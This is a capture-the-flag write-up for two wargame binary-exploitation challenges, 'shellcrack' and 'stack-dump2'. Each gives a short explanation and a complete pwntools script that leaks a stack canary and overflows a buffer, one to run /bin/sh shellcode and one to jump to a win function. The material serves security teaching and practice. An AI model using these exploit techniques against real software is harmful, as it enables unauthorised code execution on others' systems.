# shellcrack

> Flag: FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoid2FyNS1zaGVsbGNyYWNrIiwiaXAiOiIyMDIuODcuMTYyLjI4Iiwic2Vzc2lvbiI6Ijk5ZGFkNTBlLTM2NTAtNDQ5ZS04YzA3LWMyZWJjMjFjZTdlOSJ9.UYl_iLANQFKnizzvSQw5teHQsVO3erIPGCQ3aSuK5ik}

## Scenario

There is an 8 byte long canary (generated from /dev/urandom) stored at ebp-0x14.  
Input is read into a buffer at ebp-0x44 to ebp-0x34, which is copied to ebp-0x24 to ebp-0x14.  
A vulnerability with the "%s" format specifier exists which allows the canary to be read from

## Solution

Send a name that is 16 bytes long, such as to remove the NULL terminator from the string.  
This will cause the program to print out the canary after the name.  
We can then perform a buffer overflow, and shellcode into the buffer whilst keeping the canary value correct.

## Script

```python3
from pwn import *

p = process("./shellcrack")
p = remote("plsdonthaq.me", 5001)

# Buffer from ebp-0x44 to ebp-0x34 copied to ebp-0x24 to ebp-0x14
# Canary is 8 bytes long at vuln::ebp-0x14 -> ebp-0x6

# the %s expansion will keep going until it hits a null byte
p.recvuntil('Enter as:')
nameStr = "." * 0x10
p.send(nameStr)
p.recvuntil("This is the 6447 wargaming gateway, " + nameStr)

# Get the 8 byte canary
canary = p.recvuntil("!\n", drop=True)[:8]
print(f"Canary is {bytearray(canary)}")

# Get the buffer address
p.recvuntil('Write your data to the buffer[')
buffer = int(p.recvuntil('].\n', drop=True), 16)
# :: buffer = ebp - 0x44
# :: ebp = buffer + 0x44
ebp = buffer + 0x44
print(f"Buffer at {hex(buffer)}")
print(f"vuln::ebp at {hex(ebp)}")

# Pop a shell
assembly = f"""
   push 0x0068732f
   push 0x6e69622f

   mov ebx, esp

   mov eax, 0xb
   mov ecx, 0
   mov edx, 0
   mov esi, 0
   int 0x80
"""

shellCode = asm(re.sub('#.*$', '', assembly, flags=re.MULTILINE))
print(f"Shellcode is {len(shellCode)} bytes long")

payload = b""
payload += shellCode                        # Put the shell code into the buffer
payload += b'\x90' * (0x30 - len(payload))  # Santa's NOP-sled
payload += canary                           # Place back the canary
payload += b'A' * 16                        # Padding to reach the old ebp
payload += p32(buffer)                      # Modify the return address to our shellcode

p.sendline(payload)

p.interactive() 
```

---

# stack-dump2

> Flag: FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoid2FyNS1zdGFjay1kdW1wMiIsImlwIjoiMjAyLjg3LjE2Mi4yOCIsInNlc3Npb24iOiIzNzNjY2E0YS05MzE3LTQwOGUtYThlMi1iM2I3NmE5YzJiYjUifQ.7k0UECcN17jxnjYJqJsrgtQddBXb4GkEPqg0qytD20k}

## Scenario

Similar to the week 3 stack-dump exercise, however this time with all protections enabled.  
We will need to leak the canary (input -> dump) in order to successfully override the return address of main

## Solution

An address on the stack is given, which we can use to calculate the address of the canary. By then using the memory map, we can figure out where the win function address has been relocated to.  
With the canary value and the win address, we can perform a buffer overflow at ebp-0x68.

## Script

```python3
from pwn import *

p = process("./stack-dump2")
p = remote("plsdonthaq.me", 5002)

# Get the canary address
p.recvuntil("To make things easier, here's a useful stack pointer ")
stackAddr = int(p.recvline(keepends=False), 16)
print(f"Received stack address {hex(stackAddr)}")
ebp = stackAddr + 0x71
print(f"main::ebp = {hex(ebp)}")
canary_addr = ebp - 0x8
print(f"main::canary at {hex(canary_addr)}")

# Get the canary value
p.sendline(b'a')
p.recv()
p.sendline(b'5')
p.recv()
p.sendline(p32(canary_addr))
p.recv()
p.sendline('b')
p.recvuntil(": ")
canary = p.recvline(keepends=False)[:4]
print(f"Canary value is: {canary}")

# Get the win address
p.recv()
p.sendline(b'c')
BASE = int(p.recvline().split(b'-')[0], 16)
p.recv()
print(f"Program base address is {hex(BASE)}")
print(f"main should be at {hex(BASE + 0x796)}")
win_offset = 0x76d
win_addr = BASE + win_offset
print(f"win address at at {hex(win_addr)}")

# Perform the buffer overflow
payload = b""
payload += b'.' * (0x68-0x8)
payload += canary
payload += b'.' * 8
payload += p32(win_addr)

p.sendline(b'a')
p.sendline(str(len(payload) + 1))
p.sendline(payload)

# Now exit/return from main
p.sendline("d")
p.interactive()
```

---